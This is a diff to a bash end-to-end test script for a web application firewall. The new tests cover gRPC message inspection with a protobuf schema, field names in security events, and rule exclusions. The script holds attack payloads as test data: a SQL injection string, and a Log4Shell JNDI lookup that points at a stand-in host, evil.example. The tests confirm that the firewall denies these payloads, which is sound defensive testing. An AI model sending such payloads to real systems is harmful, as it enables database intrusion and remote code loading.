@@ -528,6 +528,32 @@ grpc_message_isnt() {
   done
 }
 GRPC_MESSAGE_ATTACK="1' OR '1'='1' -- "
+# grpc_method_is CODE METHOD TEXT: grpc_message_is, calling METHOD (one
+# the schema doesn't describe) with the same request.
+grpc_method_is() {
+  local port
+  for port in "$CUSTOM_PORT" "$PLAIN_PORT" "$TRAEFIK_PORT"; do
+    [[ $("$work/grpchealth" -authority "$HOST" -method "$2" -service "$3" "127.0.0.1:$port" 2>/dev/null) == "$1" ]] || return 1
+  done
+}
+# engine_events: the security events the engines in the Envoy pods logged.
+engine_events() {
+  "${KUBECTL[@]}" -n "$EG_NS" logs -l app.kubernetes.io/name=envoy -c inkwall-engine --tail=-1 | grep '"security event"'
+}
+# denied_naming VARIABLE [PATTERN]: an attack in a Health/Check message is
+# denied, and an engine's event (matching PATTERN too) names VARIABLE.
+denied_naming() {
+  grpc_message_is PermissionDenied "$GRPC_MESSAGE_ATTACK" &&
+    engine_events | grep -F "\"variable\":\"$1\"" | grep -E "${2:-.}" >/dev/null
+}
+# undescribed_read: an attack in a message of a method the schema doesn't
+# describe is denied, its event naming the field by number.
+undescribed_read() {
+  grpc_method_is PermissionDenied /grpc.health.v1.Health/Nope "$GRPC_MESSAGE_ATTACK" &&
+    engine_events | grep -F '"path":"/grpc.health.v1.Health/Nope"' | grep -F '"variable":"ARGS:1"' >/dev/null
+}
+# The policy's gRPC schema (#316): grpc/health/v1/health.proto's set.
+SCHEMA_BODY='  body: {grpcMessages: Inspect, grpcSchema: {configMapRef: {name: health-schema, key: set.binpb}}}'
 # Log4Shell (944150), quoted: not a shell expansion.
 GRPC_ATTACK="x-api-key=\${jndi:ldap://evil.example/a}"
 no_limits() { ! "${KUBECTL[@]}" -n "$NS" get clienttrafficpolicy inkwall-waf-custom inkwall-waf-plain -o name 2>/dev/null | grep . >/dev/null; }
@@ -632,6 +658,28 @@ eventually "with grpcMessages: Inspect, an attack in a gRPC message is denied" \
 check "and a clean gRPC call passes" grpc_are OK
 check "an attack in a gRPC-Web text (base64) message is denied" grpc_web_text_denied
 check "and a clean gRPC-Web text call isn't" grpc_web_text_not_denied
+# gRPC messages with their schema (#316): fields named by their paths.
+"$work/grpchealth" -descriptor-set >"$work/health.binpb"
+"${KUBECTL[@]}" -n "$NS" create configmap health-schema --from-file=set.binpb="$work/health.binpb" >/dev/null
+"${KUBECTL[@]}" -n "$NS" label configmap health-schema waf.inkwall.dev/rules=true >/dev/null
+policy Block "" "$SCHEMA_BODY"
+eventually "with grpcSchema, an attack in HealthCheckRequest.service is denied, its event naming ARGS:service" \
+  denied_naming ARGS:service
+check "and a clean gRPC call passes" grpc_are OK
+check "a method the schema doesn't describe is still read, by field numbers (ARGS:1)" undescribed_read
+# An exclusion by the field's name: the rules that matched ARGS:service.
+SCHEMA_RULES=$(engine_events | grep -oE '"rule_id":[0-9]+,"variable":"ARGS:service"' | grep -oE '[0-9]+' | sort -u | paste -sd, -)
+policy Block "" "$SCHEMA_BODY
+  exclusions: [{ruleIDs: [$SCHEMA_RULES], when: {argument: service}}]"
+eventually "an exclusion with when: {argument: service} lets the attack through" \
+  grpc_message_isnt PermissionDenied "$GRPC_MESSAGE_ATTACK"
+check "and only there: the undescribed method's ARGS:1 is still denied" \
+  grpc_method_is PermissionDenied /grpc.health.v1.Health/Nope "$GRPC_MESSAGE_ATTACK"
+# One message at a time (grpcStreams: PerMessage, #315): the same names.
+policy Block "" '  body: {grpcMessages: Inspect, grpcStreams: PerMessage, grpcSchema: {configMapRef: {name: health-schema, key: set.binpb}}}'
+eventually "with grpcStreams: PerMessage, the message's event names ARGS:service too" \
+  denied_naming ARGS:service '"stream_event":1'
+policy Block Inspect
 
 echo "== client IP (#364)"
 # A client pod stands in for an HTTP load balancer: it sends its request
